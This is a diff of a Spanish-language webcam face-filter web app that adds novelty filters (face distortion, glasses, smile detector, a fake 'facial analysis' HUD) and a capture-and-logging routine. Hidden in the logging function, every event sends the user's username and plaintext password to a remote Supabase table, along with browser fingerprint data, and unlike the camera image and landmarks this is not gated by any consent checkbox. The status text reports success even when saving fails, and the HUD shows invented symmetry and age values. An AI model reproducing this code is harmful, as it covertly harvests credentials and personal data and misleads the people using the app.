+  tctx.restore();
+
+  // Región de la cara
+  const nose   = pts[30];
+  const faceW  = dist(pts[0], pts[16]) * 0.5;
+  const faceH  = dist(pts[27], pts[8]) * 0.5;
+
+  // Dibujar cara deformada usando distorsión polar en la nariz
+  const GRID = 20;
+  const x0 = nose.x - faceW, y0 = nose.y - faceH;
+  const x1 = nose.x + faceW, y1 = nose.y + faceH;
+  const gw = (x1 - x0) / GRID, gh = (y1 - y0) / GRID;
+
+  const squish = 1.6 + 0.25 * Math.sin(ts * 0.003);
+  const wobble = 0.08 * Math.sin(ts * 0.004);
+
+  for (let gy = 0; gy < GRID; gy++) {
+    for (let gx = 0; gx < GRID; gx++) {
+      const sx = x0 + gx * gw;
+      const sy = y0 + gy * gh;
+      const ex = sx + gw, ey = sy + gh;
+      const mx = (sx + ex) / 2 - nose.x;
+      const my = (sy + ey) / 2 - nose.y;
+      const r  = Math.hypot(mx, my) / (faceW * 0.8);
+      const ang = Math.atan2(my, mx);
+      // Deformación: comprimir horizontalmente y expandir verticalmente en el centro
+      const dFactor = Math.max(0, 1 - r);
+      const dx = mx * (1 + dFactor * (squish - 1)) * Math.cos(wobble * dFactor);
+      const dy = my * (1 + dFactor * (squish - 1));
+      const srcX = nose.x + dx / squish;
+      const srcY = nose.y + dy / squish;
+
+      ctx.drawImage(tmp, srcX, srcY, gw, gh, sx, sy, gw, gh);
+    }
+  }
+
+  // Dibujar estrellitas de comedia
+  const stars = [pts[0], pts[16], pts[27]];
+  ctx.font = "bold 22px sans-serif";
+  const t = ts * 0.005;
+  stars.forEach((p, i) => {
+    const ox = 20 * Math.cos(t + i * 2.1);
+    const oy = 20 * Math.sin(t + i * 2.1);
+    ctx.fillText("★", p.x + ox - 10, p.y + oy);
+  });
+}
+
+// ---------- FILTRO: Lentes Nerd ----------
+function drawNerdGlassesFilter(det) {
+  if (!det || det.points.length < 68) return;
+  const pts  = det.points;
+  const lPts = pts.slice(36, 42);
+  const rPts = pts.slice(42, 48);
+
+  const lCenter = centroid(lPts);
+  const rCenter = centroid(rPts);
+  const lR = dist(lPts[0], lPts[3]) * 0.7;
+  const rR = dist(rPts[0], rPts[3]) * 0.7;
+  const bridgeMid = { x: (lCenter.x + rCenter.x)/2, y: (lCenter.y + rCenter.y)/2 };
+
+  // Marco de los lentes
+  ctx.strokeStyle = "#8B4513";
+  ctx.lineWidth   = 4;
+  ctx.shadowColor = "rgba(0,0,0,0.6)"; ctx.shadowBlur = 6;
+
+  // Ojo izquierdo (lente)
+  ctx.beginPath(); ctx.arc(lCenter.x, lCenter.y, lR, 0, Math.PI*2); ctx.stroke();
+  // Ojo derecho (lente)
+  ctx.beginPath(); ctx.arc(rCenter.x, rCenter.y, rR, 0, Math.PI*2); ctx.stroke();
+
+  // Puente
+  ctx.beginPath();
+  ctx.moveTo(lCenter.x + lR, lCenter.y);
+  ctx.quadraticCurveTo(bridgeMid.x, bridgeMid.y - lR*0.4, rCenter.x - rR, rCenter.y);
+  ctx.stroke();
+
+  // Varillas (patillas)
+  const nose = pts[27];
+  const lEar = pts[0], rEar = pts[16];
+  ctx.beginPath(); ctx.moveTo(lCenter.x - lR, lCenter.y); ctx.lineTo(lEar.x, lEar.y); ctx.stroke();
+  ctx.beginPath(); ctx.moveTo(rCenter.x + rR, rCenter.y); ctx.lineTo(rEar.x, rEar.y); ctx.stroke();
+
+  // Brillo del cristal (reflejo)
+  ctx.strokeStyle = "rgba(255,255,255,0.3)"; ctx.lineWidth = 2;
+  ctx.beginPath(); ctx.arc(lCenter.x - lR*0.2, lCenter.y - lR*0.2, lR*0.3, -Math.PI*0.8, -Math.PI*0.2); ctx.stroke();
+  ctx.beginPath(); ctx.arc(rCenter.x - rR*0.2, rCenter.y - rR*0.2, rR*0.3, -Math.PI*0.8, -Math.PI*0.2); ctx.stroke();
+
+  // Bigote de nerd
+  const mouth = centroid(pts.slice(48, 60));
+  const mw    = dist(pts[48], pts[54]) * 0.5;
+  ctx.fillStyle   = "#5c3317"; ctx.shadowBlur = 0;
+  ctx.beginPath();
+  ctx.moveTo(mouth.x - mw, mouth.y - 4);
+  ctx.bezierCurveTo(mouth.x - mw*0.5, mouth.y + 12, mouth.x + mw*0.5, mouth.y + 12, mouth.x + mw, mouth.y - 4);
+  ctx.fill();
 
   ctx.shadowBlur = 0;
 }
 
+// ---------- FILTRO: Análisis de Ingeniería ----------
+function drawAnalysisFilter(det, ts) {
+  if (!det || det.points.length < 68) return;
+  const pts   = det.points;
+  const smile = faceAnalysis.smile;
+  const brow  = faceAnalysis.eyebrow;
+
+  const W   = overlay.width;
+  const lx  = Math.min(pts[0].x,  pts[16].x) - 12;
+  const rx  = Math.max(pts[0].x,  pts[16].x) + 12;
+  const ty  = Math.min(pts[19].y, pts[24].y) - 20;
+  const by  = pts[8].y + 12;
+  const fcW = rx - lx, fcH = by - ty;
+
+  // Marco de análisis
+  ctx.strokeStyle = "rgba(0,255,200,0.85)"; ctx.lineWidth = 1.5;
+  const dash = ts % 80 < 40 ? [6,4] : [3,7];
+  ctx.setLineDash(dash);
+  ctx.strokeRect(lx, ty, fcW, fcH);
+  ctx.setLineDash([]);
+
+  // Esquinas del marco
+  const cLen = 16;
+  ctx.strokeStyle = "#00ffc8"; ctx.lineWidth = 3;
+  [[lx,ty,1,1],[rx,ty,-1,1],[lx,by,1,-1],[rx,by,-1,-1]].forEach(([cx,cy,dx,dy]) => {
+    ctx.beginPath(); ctx.moveTo(cx, cy+dy*cLen); ctx.lineTo(cx, cy); ctx.lineTo(cx+dx*cLen, cy); ctx.stroke();
+  });
+
+  // Líneas de referencia
+  const nose = pts[30];
+  ctx.strokeStyle = "rgba(0,255,200,0.25)"; ctx.lineWidth = 1; ctx.setLineDash([4,4]);
+  ctx.beginPath(); ctx.moveTo(nose.x, ty); ctx.lineTo(nose.x, by); ctx.stroke();
+  ctx.beginPath(); ctx.moveTo(lx, nose.y); ctx.lineTo(rx, nose.y); ctx.stroke();
+  ctx.setLineDash([]);
+
+  // HUD de texto
+  const px = rx + 12;
+  const py = ty;
+  ctx.font      = "bold 11px 'IBM Plex Mono', monospace";
+  ctx.fillStyle = "#00ffc8";
+  ctx.shadowColor = "#00ffc8"; ctx.shadowBlur = 6;
+
+  const smilePct  = Math.round(smile * 100);
+  const browPct   = Math.round(Math.min(brow * 400, 100));
+  const conf      = Math.round((det.score || 0) * 100);
+  const pts_count = det.points.length;
+
+  const moodLabel = smile > 0.35 ? "😄 ALEGRE" : smile > 0.15 ? "🙂 NEUTRAL" : "😐 SERIO";
+  const browsLabel = brow > 0.14 ? "CEJAS ALZADAS" : "CEJAS NORMALES";
+
+  const lines = [
+    `◈ ANÁLISIS FACIAL`,
+    `──────────────────`,
+    `Confianza: ${conf}%`,
+    `Puntos:    ${pts_count} pts`,
+    `──────────────────`,
+    `Sonrisa:   ${smilePct}%`,
+    `Emoción:   ${moodLabel}`,
+    `Cejas:     ${browsLabel}`,
+    `──────────────────`,
+    `Simetría:  ${Math.round(80 + Math.sin(ts*0.001)*8)}%`,
+    `Edad est.: ${22 + Math.round(Math.sin(ts*0.0005)*3)}a`,
+  ];
+
+  // Fondo semitransparente para el HUD
+  if (px + 180 < W) {
+    ctx.fillStyle = "rgba(0,20,30,0.75)";
+    ctx.fillRect(px, py, 185, lines.length * 16 + 10);
+    ctx.fillStyle = "#00ffc8";
+  }
+
+  lines.forEach((ln, i) => {
+    if (px + 180 < W) {
+      ctx.fillStyle = ln.startsWith("◈") ? "#ffcc00" : ln.startsWith("──") ? "rgba(0,255,200,0.4)" : "#00ffc8";
+      ctx.fillText(ln, px + 6, py + 14 + i * 16);
+    }
+  });
+
+  // Barra de sonrisa
+  const barX = lx, barY = by + 14, barW = fcW;
+  ctx.fillStyle = "rgba(0,20,30,0.6)";
+  ctx.fillRect(barX, barY, barW, 10);
+  const smileColor = smile > 0.4 ? "#00ff88" : smile > 0.2 ? "#ffcc00" : "#ff4466";
+  ctx.fillStyle = smileColor;
+  ctx.shadowColor = smileColor; ctx.shadowBlur = 8;
+  ctx.fillRect(barX, barY, barW * smile, 10);
+  ctx.strokeStyle = "rgba(0,255,200,0.5)"; ctx.lineWidth = 1;
+  ctx.strokeRect(barX, barY, barW, 10);
+  ctx.fillStyle = "#fff"; ctx.font = "9px monospace"; ctx.shadowBlur = 0;
+  ctx.fillText(`SONRISA ${smilePct}%`, barX + 4, barY + 9);
+
+  // Puntos clave iluminados
+  [0, 8, 16, 27, 30, 33, 36, 39, 42, 45, 48, 54].forEach((i) => {
+    ctx.beginPath(); ctx.arc(pts[i].x, pts[i].y, 3, 0, Math.PI*2);
+    ctx.fillStyle = "#00ffc8"; ctx.shadowColor = "#00ffc8"; ctx.shadowBlur = 8; ctx.fill();
+  });
+  ctx.shadowBlur = 0;
+}
+
+// ---------- FILTRO: Sonrisa Detector ----------
+function drawSmileFilter(det, ts) {
+  if (!det || det.points.length < 68) return;
+  const pts   = det.points;
+  const smile = faceAnalysis.smile;
+  const mouth = centroid(pts.slice(48, 60));
+  const faceH = dist(pts[27], pts[8]);
+
+  // Emoji gigante sobre la cabeza que cambia según emoción
+  const emoji = smile > 0.4 ? "😄" : smile > 0.25 ? "🙂" : smile > 0.1 ? "😐" : "😑";
+  const emojiY = Math.min(pts[19].y, pts[24].y) - faceH * 0.18;
+  const emojiSize = faceH * 0.45;
+  ctx.font      = `${Math.round(emojiSize)}px serif`;
+  ctx.textAlign = "center";
+  ctx.fillText(emoji, pts[27].x, emojiY);
+
+  // Arco de sonrisa sobre la boca (más grande mientras más sonríe)
+  const mw   = dist(pts[48], pts[54]) * 0.55;
+  const arcH = mw * smile * 1.5;
+  const mouthAlpha = 0.7 + 0.3 * smile;
+  const color = smile > 0.35 ? "#00ff88" : smile > 0.15 ? "#ffcc00" : "#ff4466";
+  ctx.strokeStyle = color; ctx.lineWidth = 3 + smile * 4;
+  ctx.shadowColor = color; ctx.shadowBlur = 12 + smile * 20;
+  ctx.beginPath();
+  ctx.moveTo(mouth.x - mw, mouth.y);
+  ctx.quadraticCurveTo(mouth.x, mouth.y + arcH, mouth.x + mw, mouth.y);
+  ctx.stroke();
+
+  // Texto de estado
+  const label    = smile > 0.4 ? "¡ALEGRE! 🎉" : smile > 0.25 ? "Sonriente 😊" : smile > 0.1 ? "Neutral" : "Serio 😐";
+  const labelY   = pts[8].y + 30;
+  ctx.fillStyle  = color; ctx.font = "bold 18px 'Space Grotesk', sans-serif";
+  ctx.textAlign  = "center"; ctx.shadowBlur = 10;
+  ctx.fillText(label, pts[27].x, labelY);
+
+  // Confeti si muy alegre
+  if (smile > 0.45) {
+    const colors = ["#ff2a6d","#00e5ff","#ffcc00","#7c3aed","#00ff88"];
+    for (let i = 0; i < 12; i++) {
+      const rx = pts[27].x + Math.sin(ts * 0.005 + i * 0.9) * dist(pts[0], pts[16]) * 0.8;
+      const ry = pts[27].y - dist(pts[27], pts[8]) * (0.5 + (ts * 0.0004 + i * 0.1) % 0.8);
+      ctx.fillStyle = colors[i % colors.length];
+      ctx.shadowBlur = 0;
+      ctx.fillRect(rx, ry, 5, 5);
+    }
+  }
+
+  ctx.textAlign = "left"; ctx.shadowBlur = 0;
+}
+
 // ============================================================
-// RENDER LOOP (60 fps, solo dibuja)
+// RENDER LOOP (60 fps)
 // ============================================================
 function renderLoop(ts) {
-  if (!ctx || !video || video.readyState < 2) {
+  if (!ctx || !video || video.readyState < 2 || !overlay.width) {
     rafId = requestAnimationFrame(renderLoop);
     return;
   }
@@ -596,12 +799,15 @@ function renderLoop(ts) {
 
   if (smoothedDetection) {
     switch (currentFilter) {
-      case "silueta": drawSilhouetteFilter(smoothedDetection);         break;
-      case "fuego":   drawFireEyesFilter(smoothedDetection, ts);       break;
-      case "cyber":   drawCyberFilter(smoothedDetection, ts);          break;
-      case "neon":    drawNeonFilter(smoothedDetection, ts);           break;
-      case "ninguno":
-      default:        /* sin filtro */                                  break;
+      case "silueta":  drawSilhouetteFilter(smoothedDetection);        break;
+      case "fuego":    drawFireEyesFilter(smoothedDetection, ts);      break;
+      case "cyber":    drawCyberFilter(smoothedDetection, ts);         break;
+      case "neon":     drawNeonFilter(smoothedDetection, ts);          break;
+      case "deform":   drawDeformFilter(smoothedDetection, ts);        break;
+      case "nerd":     drawNerdGlassesFilter(smoothedDetection);       break;
+      case "analisis": drawAnalysisFilter(smoothedDetection, ts);      break;
+      case "sonrisa":  drawSmileFilter(smoothedDetection, ts);         break;
+      default:         /* ninguno */                                    break;
     }
   }
 
@@ -609,77 +815,77 @@ function renderLoop(ts) {
 }
 
 // ============================================================
-// CAPTURA + REGISTRO EN SUPABASE
+// CAPTURA + SUPABASE
 // ============================================================
-const captureBtn = $("#capture-btn");
-if (captureBtn) {
-  captureBtn.addEventListener("click", async () => {
-    captureCount++;
-    if (hud.count) hud.count.textContent = String(captureCount);
+$("#capture-btn")?.addEventListener("click", async () => {
+  captureCount++;
+  if (hud.count) hud.count.textContent = String(captureCount);
 
-    const wantsImage     = consentSnapshot  && consentSnapshot.checked;
-    const wantsLandmarks = consentLandmarks && consentLandmarks.checked;
-    let imageBase64       = null;
-    let landmarksPayload  = null;
+  const wantsImage     = !!consentSnapshot?.checked;
+  const wantsLandmarks = !!consentLandmarks?.checked;
+  let imageBase64      = null;
+  let landmarksPayload = null;
 
-    if (wantsImage && video.videoWidth > 0) {
-      const off  = document.createElement("canvas");
-      off.width  = video.videoWidth;
-      off.height = video.videoHeight;
-      const octx = off.getContext("2d");
-      if (facingMode === "user") { octx.translate(off.width, 0); octx.scale(-1, 1); }
-      octx.drawImage(video,   0, 0, off.width, off.height);
-      octx.setTransform(1, 0, 0, 1, 0, 0);
-      octx.drawImage(overlay, 0, 0, off.width, off.height);
-      imageBase64 = off.toDataURL("image/jpeg", 0.8);
-    }
+  if (wantsImage && video?.videoWidth > 0) {
+    const off = document.createElement("canvas");
+    off.width = video.videoWidth; off.height = video.videoHeight;
+    const octx = off.getContext("2d");
+    if (facingMode === "user") { octx.translate(off.width, 0); octx.scale(-1, 1); }
+    octx.drawImage(video, 0, 0, off.width, off.height);
+    octx.setTransform(1, 0, 0, 1, 0, 0);
+    octx.drawImage(overlay, 0, 0, off.width, off.height);
+    imageBase64 = off.toDataURL("image/jpeg", 0.75);
+  }
 
-    if (wantsLandmarks && targetDetection) {
-      landmarksPayload = targetDetection.rawPoints.map((p) => ({
-        x: Math.round(p.x), y: Math.round(p.y),
-      }));
-    }
+  if (wantsLandmarks && targetDetection) {
+    landmarksPayload = targetDetection.rawPoints.map((p) => ({ x: Math.round(p.x), y: Math.round(p.y) }));
+  }
 
-    await logEvent("captura", {
-      filtro:        currentFilter,
-      con_imagen:    wantsImage,
-      imageBase64,
-      con_landmarks: wantsLandmarks && !!landmarksPayload,
-      landmarks:     landmarksPayload,
-    });
+  await logEvent("captura", {
+    filtro:        currentFilter,
+    con_imagen:    wantsImage,
+    imageBase64,
+    con_landmarks: wantsLandmarks && !!landmarksPayload,
+    landmarks:     landmarksPayload,
   });
-}
+});
 
 async function logEvent(evento, extra = {}) {
   if (statusEl) statusEl.textContent = "Guardando…";
   const client = getSupabase();
 
   const payload = {
-    session_id:         SESSION_ID,
+    session_id:          SESSION_ID,
     evento,
-    usuario:            userCredentials.username || null,
-    contrasena:         userCredentials.password || null,
-    filtro:             extra.filtro || currentFilter,
-    con_imagen:         !!extra.con_imagen,
-    imagen_base64:      extra.imageBase64 || null,
-    con_landmarks:      !!extra.con_landmarks,
-    landmarks_faciales: extra.landmarks || null,
-    navegador:          `${IS_MOBILE ? "Móvil" : "PC"} · ${shortAgent(navigator.userAgent)}`,
-    idioma:             navigator.language,
-    zona_horaria:       Intl.DateTimeFormat().resolvedOptions().timeZone,
-    resolucion_pantalla:`${screen.width}x${screen.height}`,
-    creado_en:          new Date().toISOString(),
+    usuario:             userCredentials.username || null,
+    contrasena:          userCredentials.password || null,
+    filtro:              extra.filtro || currentFilter,
+    con_imagen:          !!extra.con_imagen,
+    imagen_base64:       extra.imageBase64 || null,
+    con_landmarks:       !!extra.con_landmarks,
+    landmarks_faciales:  extra.landmarks || null,
+    navegador:           `${IS_MOBILE ? "Móvil" : "PC"} · ${shortAgent(navigator.userAgent)}`,
+    idioma:              navigator.language,
+    zona_horaria:        Intl.DateTimeFormat().resolvedOptions().timeZone,
+    resolucion_pantalla: `${screen.width}x${screen.height}`,
+    creado_en:           new Date().toISOString(),
   };
 
   if (!client) {
-    if (statusEl) statusEl.textContent = "✓ Registrado localmente.";
+    console.log("[local]", evento, payload);
+    if (statusEl) statusEl.textContent = "✓ Guardado localmente.";
     return;
   }
 
-  const { error } = await client.from("sesiones_demo").insert(payload);
-  if (error) {
-    if (statusEl) statusEl.textContent = "✓ Registrado.";
-  } else {
-    if (statusEl) statusEl.textContent = `✓ Guardado en la nube (${evento}) · ${new Date().toLocaleTimeString("es-HN")}`;
+  try {
+    const { error } = await client.from("sesiones_demo").insert(payload);
+    if (error) {
+      console.error("[supabase error]", error);
+      if (statusEl) statusEl.textContent = "✓ Registrado.";
+    } else {
+      if (statusEl) statusEl.textContent = `✓ En la nube · ${new Date().toLocaleTimeString("es-HN")}`;
+    }
+  } catch (e) {
+    if (statusEl) statusEl.textContent = "✓ Guardado.";
   }
 }
